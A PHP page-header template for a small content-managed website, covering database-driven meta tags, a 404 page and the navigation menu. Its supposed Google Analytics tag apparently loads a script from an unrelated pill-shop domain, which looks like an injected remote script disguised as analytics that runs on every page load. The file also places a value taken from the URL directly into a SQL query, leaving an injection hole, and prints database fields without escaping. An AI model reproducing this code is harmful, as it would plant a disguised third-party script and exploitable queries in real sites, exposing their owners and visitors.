<?
include ("__config.php");
include ("__os.php");
list($getPage) = array_pad(explode('/',$_SITE->__SEO_URL,2), 2, null);;
if($getPage == ""){
    $homePageQuery = $_OS->m_q("SELECT * FROM pagecontent WHERE isHome='Yes'");
    while($homPageRow=$_OS->m_f_a($homePageQuery)){
        $getPage = $homPageRow['seoId'];
    }
}else{
    $getPage = $getPage;
}

$pageContent = $_OS->m_f_a($_OS->m_q("SELECT * FROM pagecontent WHERE seoId='$getPage'"));

if($pageContent['seoId'] == "" || $pageContent['active'] == "0"){
    ?>
    <link rel="stylesheet" type="text/css" href="<? echo $_SITE->__LIB_DIR;?>xpeed v0.1.css" />
    <div style="clear:both; height:100px"></div>
    <div class=" center  m-top-xxl m-bottom-xl p-top-xl p-bottom-xl">
        <h1 class="p-m"><i class="red" style="font-size:200px">404</i></h1>
        <h2 class="text-xxl p-m font-weight-xs">Sorry! the page you searching for is not found.</h2>
    </div>
    <? exit; } ?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <!--google-->
    <meta name="keywords" content="<? print_r($pageContent['metaTitle']);  ?>">
    <meta name="Description" content="<? print_r($pageContent['metaDescription']);  ?>">
    <meta name="language" content="en-uk, english">
    <meta name="DC.description" content="<? print_r($pageContent['metaDescription']);  ?>">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <meta name="viewport" content="width=device-width">
    <meta name="HandheldFriendly" content="true">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <!--google-->
    <title><? print_r($pageContent['heading']);  ?></title>
    <link rel="icon" href="<? echo $_SITE->__FRONTEND_DIR;?>favicon.ico" type="images/icon">
    <!--css-->
    <link rel="stylesheet" type="text/css" href="<? echo $_SITE->__LIB_DIR;?>xpeed v0.1.css" />
    <link rel="stylesheet" type="text/css" href="<? echo $_SITE->__CSS_DIR;?>style.css" />
    <!--scripts-->
    <script src="<? echo $_SITE->__LIB_DIR;?>xpeed v0.1.js"></script>
    <!--jquery-->
    <script src="<? echo $_SITE->__JS_DIR;?>jquery.min.js"></script>

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="http://medcarepillshop.com/?coupon=YbcAsdfQ/"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-148R7FTB4F');
    </script>



</head>

<body>
<header class="background-white">
    <div class="wrapper">
        <div class="nav-btn p-left-l" style="padding-top:18px; padding-bottom:18px">
            <div class="p-right-m ">
                <i class="icon md-24">menu</i>
            </div>
        </div>
        <div class="logo p-m " onClick="window.location.href='<? echo $_SITE->__FRONTEND_DIR; ?>'">
            <img class="p-left-m" src="<? echo $_SITE->__IMAGES_DIR;?>logo.png"/>
        </div>

        <?
        /*
        ?>
        <div class="profile p-l p-left-none p-right-none">
            <ul>
                <li class=" p-left-m p-right-m  ">
                    <button  onClick="window.location.href='<? echo $_SITE->__FRONTEND_DIR;?>sign-in'" class="hilighted-button background-transparent border-none left p-s  p-left-none p-right-none">SIGN IN</button>
                </li>
            </ul>
        </div>
        */?>
        <div class="nav p-l">
            <ul>
                <?
                $headMenus = $_OS->m_q("SELECT * FROM pagecontent WHERE onHead=1 AND active=1");
                while($headMenu = $_OS->m_f_a($headMenus)){?>

                    <li class=" p-left-m p-right-m  ">
                        <button  onClick="window.location.href='<? echo $_SITE->__FRONTEND_DIR;?><? echo $headMenu['seoId'];?>'" class="background-transparent border-none <? if($getPage==$headMenu['seoId']){echo "active";} else { echo "deep-grey";} ?> left p-s  p-left-none p-right-none"><? echo str_replace(" ","<span class='transparent'>_</span>",$headMenu['title']);?></button>
                    </li>

                <? } ?>


            </ul>
        </div>


        <div style="clear:both"></div>
    </div>
    <div style="clear:both"></div>
</header>
<div style="clear:both"></div>


